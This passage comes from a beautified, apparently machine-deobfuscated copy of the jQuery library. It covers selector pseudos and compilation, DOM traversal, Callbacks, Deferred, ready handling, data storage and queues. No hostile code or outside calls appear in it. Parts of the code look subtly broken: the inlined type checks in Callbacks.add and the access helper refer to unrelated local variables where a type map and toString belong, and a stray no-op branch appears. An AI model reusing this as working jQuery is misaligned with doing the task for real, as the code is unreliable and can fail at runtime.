            return el(e, t).length > 0;
          };
        }),
        contains: ef(function (e) {
          e = e.replace(en, er);
          return function (t) {
            return (t.textContent || i(t)).indexOf(e) > -1;
          };
        }),
        lang: ef(function (e) {
          if (!G.test(e || "")) {
            el.error("unsupported lang: " + e);
          }
          e = e.replace(en, er).toLowerCase();
          return function (t) {
            var n;
            do {
              if (n = g ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) {
                return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-");
              }
            } while ((t = t.parentNode) && 1 === t.nodeType);
            return false;
          };
        }),
        target: function (t) {
          var n = e.location && e.location.hash;
          return n && n.slice(1) === t.id;
        },
        root: function (e) {
          return e === h;
        },
        focus: function (e) {
          return e === d.activeElement && (!d.hasFocus || d.hasFocus()) && !!(e.type || e.href || ~e.tabIndex);
        },
        enabled: em(false),
        disabled: em(true),
        checked: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && !!e.checked || "option" === t && !!e.selected;
        },
        selected: function (e) {
          if (e.parentNode) {
            e.parentNode.selectedIndex;
          }
          return true === e.selected;
        },
        empty: function (e) {
          for (e = e.firstChild; e; e = e.nextSibling) {
            if (e.nodeType < 6) {
              return false;
            }
          }
          return true;
        },
        parent: function (e) {
          return !r.pseudos.empty(e);
        },
        header: function (e) {
          return J.test(e.nodeName);
        },
        input: function (e) {
          return K.test(e.nodeName);
        },
        button: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && "button" === e.type || "button" === t;
        },
        text: function (e) {
          var t;
          return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase());
        },
        first: ey(function () {
          return [0];
        }),
        last: ey(function (e, t) {
          return [t - 1];
        }),
        eq: ey(function (e, t, n) {
          return [n < 0 ? n + t : n];
        }),
        even: ey(function (e, t) {
          for (var n = 0; n < t; n += 2) {
            e.push(n);
          }
          return e;
        }),
        odd: ey(function (e, t) {
          for (var n = 1; n < t; n += 2) {
            e.push(n);
          }
          return e;
        }),
        lt: ey(function (e, t, n) {
          for (var r = n < 0 ? n + t : n > t ? t : n; --r >= 0;) {
            e.push(r);
          }
          return e;
        }),
        gt: ey(function (e, t, n) {
          for (var r = n < 0 ? n + t : n; ++r < t;) {
            e.push(r);
          }
          return e;
        })
      }
    }).pseudos.nth = r.pseudos.eq;
    for (t in {
      radio: true,
      checkbox: true,
      file: true,
      password: true,
      image: true
    }) r.pseudos[t] = eg(t);
    for (t in {
      submit: true,
      reset: true
    }) r.pseudos[t] = ev(t);
    function ex() {}
    function eb(e) {
      var t = 0;
      var n = e.length;
      for (var r = ""; t < n; t++) {
        r += e[t].value;
      }
      return r;
    }
    function e_(e, t, n) {
      var r = t.dir;
      var i = t.next;
      var o = i || r;
      var a = n && "parentNode" === o;
      var s = w++;
      return t.first ? function (t, n, i) {
        for (; t = t[r];) {
          if (1 === t.nodeType || a) {
            return e(t, n, i);
          }
        }
        return false;
      } : function (t, n, u) {
        var l;
        var c;
        var f;
        var p = [T, s];
        if (u) {
          for (; t = t[r];) {
            if ((1 === t.nodeType || a) && e(t, n, u)) {
              return true;
            }
          }
        } else {
          for (; t = t[r];) {
            if (1 === t.nodeType || a) {
              c = (f = t[b] || (t[b] = {}))[t.uniqueID] || (f[t.uniqueID] = {});
              if (i && i === t.nodeName.toLowerCase()) {
                t = t[r] || t;
              } else {
                if ((l = c[o]) && l[0] === T && l[1] === s) {
                  return p[2] = l[2];
                }
                c[o] = p;
                if (p[2] = e(t, n, u)) {
                  return true;
                }
              }
            }
          }
        }
        return false;
      };
    }
    function eT(e) {
      return e.length > 1 ? function (t, n, r) {
        for (var i = e.length; i--;) {
          if (!e[i](t, n, r)) {
            return false;
          }
        }
        return true;
      } : e[0];
    }
    function ew(e, t, n, r, i) {
      var o;
      var a = [];
      var s = 0;
      var u = e.length;
      for (var l = null != t; s < u; s++) {
        if (o = e[s]) {
          if (!(n && !n(o, r, i))) {
            a.push(o);
            if (l) {
              t.push(s);
            }
          }
        }
      }
      return a;
    }
    function eC(e, t, n, r, i, o) {
      if (r && !r[b]) {
        r = eC(r);
      }
      if (i && !i[b]) {
        i = eC(i, o);
      }
      return ef(function (o, a, s, u) {
        var l;
        var c;
        var f;
        var p = [];
        var d = [];
        var h = a.length;
        var g = o || function (e, t, n) {
          var r = 0;
          for (var i = t.length; r < i; r++) {
            el(e, t[r], n);
          }
          return n;
        }(t || "*", s.nodeType ? [s] : s, []);
        var v = e && (o || !t) ? ew(g, p, e, s, u) : g;
        var m = n ? i || (o ? e : h || r) ? [] : a : v;
        if (n) {
          n(v, m, s, u);
        }
        if (r) {
          l = ew(m, d);
          r(l, [], s, u);
          for (c = l.length; c--;) {
            if (f = l[c]) {
              m[d[c]] = !(v[d[c]] = f);
            }
          }
        }
        if (o) {
          if (i || e) {
            if (i) {
              l = [];
              for (c = m.length; c--;) {
                if (f = m[c]) {
                  l.push(v[c] = f);
                }
              }
              i(null, m = [], l, u);
            }
            for (c = m.length; c--;) {
              if ((f = m[c]) && (l = i ? P(o, f) : p[c]) > -1) {
                o[l] = !(a[l] = f);
              }
            }
          }
        } else {
          m = ew(m === a ? m.splice(h, m.length) : m);
          if (i) {
            i(null, a, m, u);
          } else {
            L.apply(a, m);
          }
        }
      });
    }
    function ek(e) {
      var t;
      var n;
      var i;
      var o = e.length;
      var a = r.relative[e[0].type];
      var s = a || r.relative[" "];
      var u = a ? 1 : 0;
      var c = e_(function (e) {
        return e === t;
      }, s, true);
      var f = e_(function (e) {
        return P(t, e) > -1;
      }, s, true);
      for (var p = [function (e, n, r) {
        var i = !a && (r || n !== l) || ((t = n).nodeType ? c(e, n, r) : f(e, n, r));
        t = null;
        return i;
      }]; u < o; u++) {
        if (n = r.relative[e[u].type]) {
          p = [e_(eT(p), n)];
        } else {
          if ((n = r.filter[e[u].type].apply(null, e[u].matches))[b]) {
            for (i = ++u; i < o && !r.relative[e[i].type]; i++) {
              ;
            }
            return eC(u > 1 && eT(p), u > 1 && eb(e.slice(0, u - 1).concat({
              value: " " === e[u - 2].type ? "*" : ""
            })).replace(F, "$1"), n, u < i && ek(e.slice(u, i)), i < o && ek(e = e.slice(i)), i < o && eb(e));
          }
          p.push(n);
        }
      }
      return eT(p);
    }
    ex.prototype = r.filters = r.pseudos;
    r.setFilters = new ex();
    a = el.tokenize = function (e, t) {
      var n;
      var i;
      var o;
      var a;
      var s;
      var u;
      var l;
      var c = k[e + " "];
      if (c) {
        return t ? 0 : c.slice(0);
      }
      s = e;
      u = [];
      for (l = r.preFilter; s;) {
        if (!n || (i = z.exec(s))) {
          if (i) {
            s = s.slice(i[0].length) || s;
          }
          u.push(o = []);
        }
        n = false;
        if (i = X.exec(s)) {
          n = i.shift();
          o.push({
            value: n,
            type: i[0].replace(F, " ")
          });
          s = s.slice(n.length);
        }
        for (a in r.filter) if ((i = Y[a].exec(s)) && (!l[a] || (i = l[a](i)))) {
          n = i.shift();
          o.push({
            value: n,
            type: a,
            matches: i
          });
          s = s.slice(n.length);
        }
        if (!n) {
          break;
        }
      }
      return t ? s.length : s ? el.error(e) : k(e, u).slice(0);
    };
    s = el.compile = function (e, t) {
      var n;
      var i;
      var o;
      var s;
      var u;
      var c;
      var f = [];
      var h = [];
      var v = S[e + " "];
      if (!v) {
        if (!t) {
          t = a(e);
        }
        for (c = t.length; c--;) {
          if ((v = ek(t[c]))[b]) {
            f.push(v);
          } else {
            h.push(v);
          }
        }
        n = h;
        o = (i = f).length > 0;
        s = n.length > 0;
        u = function (e, t, a, u, c) {
          var f;
          var h;
          var v;
          var m = 0;
          var y = "0";
          var x = e && [];
          var b = [];
          var _ = l;
          var w = e || s && r.find.TAG("*", c);
          var C = T += null == _ ? 1 : Math.random() || 0.1;
          var k = w.length;
          for (c && (l = t == d || t || c); y !== k && null != (f = w[y]); y++) {
            if (s && f) {
              h = 0;
              for (t || f.ownerDocument == d || (p(f), a = !g); v = n[h++];) {
                if (v(f, t || d, a)) {
                  u.push(f);
                  break;
                }
              }
              if (c) {
                T = C;
              }
            }
            if (o) {
              if (f = !v && f) {
                m--;
              }
              if (e) {
                x.push(f);
              }
            }
          }
          m += y;
          if (o && y !== m) {
            for (h = 0; v = i[h++];) {
              v(x, b, t, a);
            }
            if (e) {
              if (m > 0) {
                for (; y--;) {
                  if (!(x[y] || b[y])) {
                    b[y] = j.call(u);
                  }
                }
              }
              b = ew(b);
            }
            L.apply(u, b);
            if (c && !e && b.length > 0 && m + i.length > 1) {
              el.uniqueSort(u);
            }
          }
          if (c) {
            T = C;
            l = _;
          }
          return x;
        };
        (v = S(e, o ? ef(u) : u)).selector = e;
      }
      return v;
    };
    u = el.select = function (e, t, n, i) {
      var o;
      var u;
      var l;
      var c;
      var f;
      var p = "function" == typeof e && e;
      var d = !i && a(e = p.selector || e);
      n = n || [];
      if (1 === d.length) {
        if ((u = d[0] = d[0].slice(0)).length > 2 && "ID" === (l = u[0]).type && 9 === t.nodeType && g && r.relative[u[1].type]) {
          if (!(t = (r.find.ID(l.matches[0].replace(en, er), t) || [])[0])) {
            return n;
          }
          if (p) {
            t = t.parentNode;
          }
          e = e.slice(u.shift().value.length);
        }
        for (o = Y.needsContext.test(e) ? 0 : u.length; o-- && (l = u[o], !r.relative[c = l.type]);) {
          if ((f = r.find[c]) && (i = f(l.matches[0].replace(en, er), et.test(u[0].type) && t.parentNode && undefined !== t.parentNode.getElementsByTagName && t.parentNode || t))) {
            u.splice(o, 1);
            if (!(e = i.length && eb(u))) {
              L.apply(n, i);
              return n;
            }
            break;
          }
        }
      }
      (p || s(e, d))(i, t, !g, n, !t || et.test(e) && t.parentNode && undefined !== t.parentNode.getElementsByTagName && t.parentNode || t);
      return n;
    };
    n.sortStable = b.split("").sort(N).join("") === b;
    n.detectDuplicates = !!f;
    p();
    n.sortDetached = ep(function (e) {
      return 1 & e.compareDocumentPosition(d.createElement("fieldset"));
    });
    if (!ep(function (e) {
      e.innerHTML = "<a href='#'></a>";
      return "#" === e.firstChild.getAttribute("href");
    })) {
      ed("type|href|height|width", function (e, t, n) {
        if (!n) {
          return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
        }
      });
    }
    if (!(n.attributes && ep(function (e) {
      e.innerHTML = "<input/>";
      e.firstChild.setAttribute("value", "");
      return "" === e.firstChild.getAttribute("value");
    }))) {
      ed("value", function (e, t, n) {
        if (!n && "input" === e.nodeName.toLowerCase()) {
          return e.defaultValue;
        }
      });
    }
    if (!ep(function (e) {
      return null == e.getAttribute("disabled");
    })) {
      ed("checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", function (e, t, n) {
        var r;
        if (!n) {
          return true === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null;
        }
      });
    }
    return el;
  }(e);
  b.find = T;
  b.expr = T.selectors;
  b.expr[":"] = b.expr.pseudos;
  b.uniqueSort = b.unique = T.uniqueSort;
  b.text = T.getText;
  b.isXMLDoc = T.isXML;
  b.contains = T.contains;
  b.escapeSelector = T.escape;
  var w = function (e, t, n) {
    var r = [];
    for (var i = undefined !== n; (e = e[t]) && 9 !== e.nodeType;) {
      if (1 === e.nodeType) {
        if (i && new b.fn.init(e, undefined).is(n)) {
          break;
        }
        r.push(e);
      }
    }
    return r;
  };
  var C = function (e, t) {
    for (var n = []; e; e = e.nextSibling) {
      if (1 === e.nodeType && e !== t) {
        n.push(e);
      }
    }
    return n;
  };
  var k = b.expr.match.needsContext;
  function S(e, t) {
    return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
  }
  var E = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
  function N(e, t, n) {
    return "function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item ? b.grep(e, function (e, r) {
      return !!t.call(e, r, e) !== n;
    }) : t.nodeType ? b.grep(e, function (e) {
      return e === t !== n;
    }) : "string" != typeof t ? b.grep(e, function (e) {
      return s.call(t, e) > -1 !== n;
    }) : b.filter(t, e, n);
  }
  b.filter = function (e, t, n) {
    var r = t[0];
    if (n) {
      e = ":not(" + e + ")";
    }
    return 1 === t.length && 1 === r.nodeType ? b.find.matchesSelector(r, e) ? [r] : [] : b.find.matches(e, b.grep(t, function (e) {
      return 1 === e.nodeType;
    }));
  };
  b.fn.extend({
    find: function (e) {
      var t;
      var n;
      var r = this.length;
      var i = this;
      if ("string" != typeof e) {
        return this.pushStack(new b.fn.init(e, undefined).filter(function () {
          for (t = 0; t < r; t++) {
            if (b.contains(i[t], this)) {
              return true;
            }
          }
        }));
      }
      n = this.pushStack([]);
      for (t = 0; t < r; t++) {
        b.find(e, i[t], n);
      }
      return r > 1 ? b.uniqueSort(n) : n;
    },
    filter: function (e) {
      return this.pushStack(N(this, e || [], false));
    },
    not: function (e) {
      return this.pushStack(N(this, e || [], true));
    },
    is: function (e) {
      return !!N(this, "string" == typeof e && k.test(e) ? new b.fn.init(e, undefined) : e || [], false).length;
    }
  });
  var A;
  var D = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
  (b.fn.init = function (e, t, n) {
    var r;
    var i;
    if (!e) {
      return this;
    }
    n = n || A;
    if ("string" == typeof e) {
      if (!(r = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : D.exec(e)) || !r[1] && t) {
        return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
      }
      if (r[1]) {
        t = t instanceof b ? t[0] : t;
        b.merge(this, b.parseHTML(r[1], t && t.nodeType ? t.ownerDocument || t : v, true));
        if (E.test(r[1]) && b.isPlainObject(t)) {
          for (r in t) if ("function" == typeof this[r] && "number" != typeof this[r].nodeType && "function" != typeof this[r].item) {
            this[r](t[r]);
          } else {
            this.attr(r, t[r]);
          }
        }
        return this;
      }
      if (i = v.getElementById(r[2])) {
        this[0] = i;
        this.length = 1;
      }
      return this;
    }
    return e.nodeType ? (this[0] = e, this.length = 1, this) : "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item ? undefined !== n.ready ? n.ready(e) : e(b) : b.makeArray(e, this);
  }).prototype = b.fn;
  A = new b.fn.init(v, undefined);
  var j = /^(?:parents|prev(?:Until|All))/;
  var q = {
    children: true,
    contents: true,
    next: true,
    prev: true
  };
  function L(e, t) {
    for (; (e = e[t]) && 1 !== e.nodeType;) {
      ;
    }
    return e;
  }
  b.fn.extend({
    has: function (e) {
      var t = new b.fn.init(e, this);
      var n = t.length;
      return this.filter(function () {
        for (var e = 0; e < n; e++) {
          if (b.contains(this, t[e])) {
            return true;
          }
        }
      });
    },
    closest: function (e, t) {
      var n;
      var r = 0;
      var i = this.length;
      var o = [];
      var a = "string" != typeof e && new b.fn.init(e, undefined);
      if (!k.test(e)) {
        for (; r < i; r++) {
          for (n = this[r]; n && n !== t; n = n.parentNode) {
            if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && b.find.matchesSelector(n, e))) {
              o.push(n);
              break;
            }
          }
        }
      }
      return this.pushStack(o.length > 1 ? b.uniqueSort(o) : o);
    },
    index: function (e) {
      return e ? "string" == typeof e ? s.call(new b.fn.init(e, undefined), this[0]) : s.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1;
    },
    add: function (e, t) {
      return this.pushStack(b.uniqueSort(b.merge(this.get(), new b.fn.init(e, t))));
    },
    addBack: function (e) {
      return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
    }
  });
  b.each({
    parent: function (e) {
      var t = e.parentNode;
      return t && 11 !== t.nodeType ? t : null;
    },
    parents: function (e) {
      return w(e, "parentNode");
    },
    parentsUntil: function (e, t, n) {
      return w(e, "parentNode", n);
    },
    next: function (e) {
      return L(e, "nextSibling");
    },
    prev: function (e) {
      return L(e, "previousSibling");
    },
    nextAll: function (e) {
      return w(e, "nextSibling");
    },
    prevAll: function (e) {
      return w(e, "previousSibling");
    },
    nextUntil: function (e, t, n) {
      return w(e, "nextSibling", n);
    },
    prevUntil: function (e, t, n) {
      return w(e, "previousSibling", n);
    },
    siblings: function (e) {
      return C((e.parentNode || {}).firstChild, e);
    },
    children: function (e) {
      return C(e.firstChild);
    },
    contents: function (e) {
      return null != e.contentDocument && r(e.contentDocument) ? e.contentDocument : (e.nodeName && e.nodeName.toLowerCase() === "template".toLowerCase() && (e = e.content || e), b.merge([], e.childNodes));
    }
  }, function (e, t) {
    b.fn[e] = function (n, r) {
      var i = b.map(this, t, n);
      if ("Until" !== e.slice(-5)) {
        r = n;
      }
      if (r && "string" == typeof r) {
        i = b.filter(r, i);
      }
      if (this.length > 1) {
        if (!q[e]) {
          b.uniqueSort(i);
        }
        if (j.test(e)) {
          i.reverse();
        }
      }
      return this.pushStack(i);
    };
  });
  var H = /[^\x20\t\r\n\f]+/g;
  function P(e) {
    return e;
  }
  function O(e) {
    throw e;
  }
  function I(e, t, n, r) {
    var i;
    try {
      if (e && "function" == typeof (i = e.promise) && "number" != typeof (i = e.promise).nodeType && "function" != typeof (i = e.promise).item) {
        i.call(e).done(t).fail(n);
      } else if (e && "function" == typeof (i = e.then) && "number" != typeof (i = e.then).nodeType && "function" != typeof (i = e.then).item) {
        i.call(e, t, n);
      } else {
        t.apply(undefined, [e].slice(r));
      }
    } catch (o) {
      n.apply(undefined, [o]);
    }
  }
  b.Callbacks = function (e) {
    e = "string" == typeof e ? (t = e, n = {}, b.each(t.match(H) || [], function (e, t) {
      n[t] = true;
    }), n) : b.extend({}, e);
    var t;
    var n;
    var r;
    var i;
    var o;
    var a;
    var s = [];
    var u = [];
    var l = -1;
    var c = function () {
      a = a || e.once;
      for (o = r = true; u.length; l = -1) {
        for (i = u.shift(); ++l < s.length;) {
          if (false === s[l].apply(i[0], i[1]) && e.stopOnFalse) {
            l = s.length;
            i = false;
          }
        }
      }
      if (!e.memory) {
        i = false;
      }
      r = false;
      if (a) {
        s = i ? [] : "";
      }
    };
    var f = {
      add: function () {
        if (s) {
          if (i && !r) {
            l = s.length - 1;
            u.push(i);
          }
          (function t(n) {
            b.each(n, function (n, r) {
              if ("function" == typeof r && "number" != typeof r.nodeType && "function" != typeof r.item) {
                if (!(e.unique && (r ? b.inArray(r, s) > -1 : s.length > 0))) {
                  s.push(r);
                }
              } else if (r && r.length && "string" !== (null == r ? r + "" : "object" == typeof r || "function" == typeof r ? u[l.call(r)] || "object" : typeof r)) {
                t(r);
              }
            });
          })(arguments);
          if (i && !r) {
            c();
          }
        }
        return this;
      },
      remove: function () {
        b.each(arguments, function (e, t) {
          for (var n; (n = b.inArray(t, s, n)) > -1;) {
            s.splice(n, 1);
            if (n <= l) {
              l--;
            }
          }
        });
        return this;
      },
      has: function (e) {
        return e ? b.inArray(e, s) > -1 : s.length > 0;
      },
      empty: function () {
        if (s) {
          s = [];
        }
        return this;
      },
      disable: function () {
        a = u = [];
        s = i = "";
        return this;
      },
      disabled: function () {
        return !s;
      },
      lock: function () {
        a = u = [];
        if (!(i || r)) {
          s = i = "";
        }
        return this;
      },
      locked: function () {
        return !!a;
      },
      fireWith: function (e, t) {
        if (!a) {
          t = [e, (t = t || []).slice ? t.slice() : t];
          u.push(t);
          if (!r) {
            c();
          }
        }
        return this;
      },
      fire: function () {
        f.fireWith(this, arguments);
        return this;
      },
      fired: function () {
        return !!o;
      }
    };
    return f;
  };
  b.extend({
    Deferred: function (t) {
      var n = [["notify", "progress", b.Callbacks("memory"), b.Callbacks("memory"), 2], ["resolve", "done", b.Callbacks("once memory"), b.Callbacks("once memory"), 0, "resolved"], ["reject", "fail", b.Callbacks("once memory"), b.Callbacks("once memory"), 1, "rejected"]];
      var r = "pending";
      var i = {
        state: function () {
          return r;
        },
        always: function () {
          o.done(arguments).fail(arguments);
          return this;
        },
        catch: function (e) {
          return i.then(null, e);
        },
        pipe: function () {
          var e = arguments;
          return b.Deferred(function (t) {
            b.each(n, function (n, r) {
              var i = "function" == typeof e[r[4]] && "number" != typeof e[r[4]].nodeType && "function" != typeof e[r[4]].item && e[r[4]];
              o[r[1]](function () {
                var e = i && i.apply(this, arguments);
                if (e && "function" == typeof e.promise && "number" != typeof e.promise.nodeType && "function" != typeof e.promise.item) {
                  e.promise().progress(t.notify).done(t.resolve).fail(t.reject);
                } else {
                  t[r[0] + "With"](this, i ? [e] : arguments);
                }
              });
            });
            e = null;
          }).promise();
        },
        then: function (t, r, i) {
          var o = 0;
          function a(t, n, r, i) {
            return function () {
              var s = this;
              var u = arguments;
              var l = function () {
                var e;
                var l;
                if (!(t < o)) {
                  if ((e = r.apply(s, u)) === n.promise()) {
                    throw TypeError("Thenable self-resolution");
                  }
                  if ("function" == typeof (l = e && ("object" == typeof e || "function" == typeof e) && e.then) && "number" != typeof (l = e && ("object" == typeof e || "function" == typeof e) && e.then).nodeType && "function" != typeof (l = e && ("object" == typeof e || "function" == typeof e) && e.then).item) {
                    if (i) {
                      l.call(e, a(o, n, P, i), a(o, n, O, i));
                    } else {
                      o++;
                      l.call(e, a(o, n, P, i), a(o, n, O, i), a(o, n, P, n.notifyWith));
                    }
                  } else {
                    if (r !== P) {
                      s = undefined;
                      u = [e];
                    }
                    (i || n.resolveWith)(s, u);
                  }
                }
              };
              var c = i ? l : function () {
                try {
                  l();
                } catch (e) {
                  if (b.Deferred.exceptionHook) {
                    b.Deferred.exceptionHook(e, c.stackTrace);
                  }
                  if (t + 1 >= o) {
                    if (r !== O) {
                      s = undefined;
                      u = [e];
                    }
                    n.rejectWith(s, u);
                  }
                }
              };
              if (t) {
                c();
              } else {
                if (b.Deferred.getStackHook) {
                  c.stackTrace = b.Deferred.getStackHook();
                }
                e.setTimeout(c);
              }
            };
          }
          return b.Deferred(function (e) {
            n[0][3].add(a(0, e, "function" == typeof i && "number" != typeof i.nodeType && "function" != typeof i.item ? i : P, e.notifyWith));
            n[1][3].add(a(0, e, "function" == typeof t && "number" != typeof t.nodeType && "function" != typeof t.item ? t : P));
            n[2][3].add(a(0, e, "function" == typeof r && "number" != typeof r.nodeType && "function" != typeof r.item ? r : O));
          }).promise();
        },
        promise: function (e) {
          return null != e ? b.extend(e, i) : i;
        }
      };
      var o = {};
      b.each(n, function (e, t) {
        var a = t[2];
        var s = t[5];
        i[t[1]] = a.add;
        if (s) {
          a.add(function () {
            r = s;
          }, n[3 - e][2].disable, n[3 - e][3].disable, n[0][2].lock, n[0][3].lock);
        }
        a.add(t[3].fire);
        o[t[0]] = function () {
          o[t[0] + "With"](this === o ? undefined : this, arguments);
          return this;
        };
        o[t[0] + "With"] = a.fireWith;
      });
      if (null != o) {
        b.extend(o, i);
      } else {
        i;
      }
      if (t) {
        t.call(o, o);
      }
      return o;
    },
    when: function (e) {
      var t = arguments.length;
      var n = t;
      var r = Array(n);
      var o = i.call(arguments);
      var a = b.Deferred();
      var s = function (e) {
        return function (n) {
          r[e] = this;
          o[e] = arguments.length > 1 ? i.call(arguments) : n;
          if (! --t) {
            a.resolveWith(r, o);
          }
        };
      };
      if (t <= 1 && (I(e, a.done(s(n)).resolve, a.reject, !t), "pending" === a.state() || "function" == typeof (o[n] && o[n].then) && "number" != typeof (o[n] && o[n].then).nodeType && "function" != typeof (o[n] && o[n].then).item)) {
        return a.then();
      }
      for (; n--;) {
        I(o[n], s(n), a.reject);
      }
      return a.promise();
    }
  });
  var M = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
  b.Deferred.exceptionHook = function (t, n) {
    if (e.console && e.console.warn && t && M.test(t.name)) {
      e.console.warn("jQuery.Deferred exception: " + t.message, t.stack, n);
    }
  };
  b.readyException = function (t) {
    e.setTimeout(function () {
      throw t;
    });
  };
  var W = b.Deferred();
  function B() {
    v.removeEventListener("DOMContentLoaded", B);
    e.removeEventListener("load", B);
    b.ready();
  }
  b.fn.ready = function (e) {
    W.then(e).catch(function (e) {
      b.readyException(e);
    });
    return this;
  };
  b.extend({
    isReady: false,
    readyWait: 1,
    ready: function (e) {
      if (!(true === e ? --b.readyWait : b.isReady)) {
        b.isReady = true;
        if (!(true !== e && --b.readyWait > 0)) {
          W.resolveWith(v, [b]);
        }
      }
    }
  });
  b.ready.then = W.then;
  if ("complete" !== v.readyState && ("loading" === v.readyState || v.documentElement.doScroll)) {
    v.addEventListener("DOMContentLoaded", B);
    e.addEventListener("load", B);
  } else {
    e.setTimeout(b.ready);
  }
  var R = function (e, t, n, r, i, o, a) {
    var s = 0;
    var u = e.length;
    var l = null == n;
    if ("object" === (null == n ? n + "" : "object" == typeof n || "function" == typeof n ? u[l.call(n)] || "object" : typeof n)) {
      i = true;
      for (s in n) R(e, t, s, n[s], true, o, a);
    } else if (undefined !== r && (i = true, "function" == typeof r && "number" != typeof r.nodeType && "function" != typeof r.item || (a = true), l && (a ? (t.call(e, r), t = null) : (l = t, t = function (e, t, n) {
      return l.call(new b.fn.init(e, undefined), n);
    })), t)) {
      for (; s < u; s++) {
        t(e[s], n, a ? r : r.call(e[s], s, t(e[s], n)));
      }
    }
    return i ? e : l ? t.call(e) : u ? t(e[0], n) : o;
  };
  var F = /^-ms-/;
  var z = /-([a-z])/g;
  function X(e, t) {
    return t.toUpperCase();
  }
  function U(e) {
    return e.replace(F, "ms-").replace(z, X);
  }
  function G() {
    this.expando = b.expando + G.uid++;
  }
  G.uid = 1;
  G.prototype = {
    cache: function (e) {
      var t = e[this.expando];
      if (!t) {
        t = {};
        if (1 === e.nodeType || 9 === e.nodeType || !+e.nodeType) {
          if (e.nodeType) {
            e[this.expando] = t;
          } else {
            Object.defineProperty(e, this.expando, {
              value: t,
              configurable: true
            });
          }
        }
      }
      return t;
    },
    set: function (e, t, n) {
      var r;
      var i = this.cache(e);
      if ("string" == typeof t) {
        i[t.replace(F, "ms-").replace(z, X)] = n;
      } else {
        for (r in t) i[r.replace(F, "ms-").replace(z, X)] = t[r];
      }
      return i;
    },
    get: function (e, t) {
      return undefined === t ? this.cache(e) : e[this.expando] && e[this.expando][t.replace(F, "ms-").replace(z, X)];
    },
    access: function (e, t, n) {
      return undefined === t || t && "string" == typeof t && undefined === n ? this.get(e, t) : (this.set(e, t, n), undefined !== n ? n : t);
    },
    remove: function (e, t) {
      var n;
      var r = e[this.expando];
      if (undefined !== r) {
        if (undefined !== t) {
          for (n = (t = Array.isArray(t) ? t.map(U) : (t = t.replace(F, "ms-").replace(z, X)) in r ? [t] : t.match(H) || []).length; n--;) {
            delete r[t[n]];
          }
        }
        if (undefined === t || b.isEmptyObject(r)) {
          if (e.nodeType) {
            e[this.expando] = undefined;
          } else {
            delete e[this.expando];
          }
        }
      }
    },
    hasData: function (e) {
      var t = e[this.expando];
      return undefined !== t && !b.isEmptyObject(t);
    }
  };
  var Y = new G();
  var Q = new G();
  var K = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/;
  var J = /[A-Z]/g;
  function Z(e, t, n) {
    var r;
    var i;
    if (undefined === n && 1 === e.nodeType) {
      r = "data-" + t.replace(J, "-$&").toLowerCase();
      if ("string" == typeof (n = e.getAttribute(r))) {
        try {
          i = n;
          n = "true" === i || "false" !== i && ("null" === i ? null : i === +i + "" ? +i : K.test(i) ? JSON.parse(i) : i);
        } catch (o) {}
        Q.set(e, t, n);
      } else {
        n = undefined;
      }
    }
    return n;
  }
  b.extend({
    hasData: function (e) {
      return Q.hasData(e) || Y.hasData(e);
    },
    data: function (e, t, n) {
      return Q.access(e, t, n);
    },
    removeData: function (e, t) {
      Q.remove(e, t);
    },
    _data: function (e, t, n) {
      return Y.access(e, t, n);
    },
    _removeData: function (e, t) {
      Y.remove(e, t);
    }
  });
  b.fn.extend({
    data: function (e, t) {
      var n;
      var r;
      var i;
      var o = this[0];
      var a = o && o.attributes;
      if (undefined === e) {
        if (this.length && (i = Q.get(o), 1 === o.nodeType && !Y.get(o, "hasDataAttrs"))) {
          for (n = a.length; n--;) {
            if (a[n] && 0 === (r = a[n].name).indexOf("data-")) {
              Z(o, r = r.slice(5).replace(F, "ms-").replace(z, X), i[r]);
            }
          }
          Y.set(o, "hasDataAttrs", true);
        }
        return i;
      }
      return "object" == typeof e ? this.each(function () {
        Q.set(this, e);
      }) : R(this, function (t) {
        var n;
        if (o && undefined === t) {
          return undefined !== (n = Q.get(o, e)) ? n : undefined !== (n = Z(o, e)) ? n : undefined;
        }
        this.each(function () {
          Q.set(this, e, t);
        });
      }, null, t, arguments.length > 1, null, true);
    },
    removeData: function (e) {
      return this.each(function () {
        Q.remove(this, e);
      });
    }
  });
  b.extend({
    queue: function (e, t, n) {
      var r;
      if (e) {
        t = (t || "fx") + "queue";
        r = Y.get(e, t);
        if (n) {
          if (!r || Array.isArray(n)) {
            r = Y.access(e, t, b.makeArray(n));
          } else {
            r.push(n);
          }
        }
        return r || [];
      }
    },
    dequeue: function (e, t) {
      t = t || "fx";
      var n = b.queue(e, t);
      var r = n.length;
      var i = n.shift();
      var o = b._queueHooks(e, t);
      if ("inprogress" === i) {
        i = n.shift();
        r--;
      }
      if (i) {
        if ("fx" === t) {
          n.unshift("inprogress");
        }
        delete o.stop;
        i.call(e, function () {
          b.dequeue(e, t);
        }, o);
      }
      if (!r && o) {
        o.empty.fire();
      }
    },
    _queueHooks: function (e, t) {
      var n = t + "queueHooks";
      return Y.get(e, n) || Y.access(e, n, {
        empty: b.Callbacks("once memory").add(function () {
          Y.remove(e, [t + "queue", n]);
        })
      });
    }
  });
  b.fn.extend({
    queue: function (e, t) {
      var n = 2;
      if ("string" != typeof e) {
        t = e;
        e = "fx";
        n--;
      }
      return arguments.length < n ? b.queue(this[0], e) : undefined === t ? this : this.each(function () {
        var n = b.queue(this, e, t);
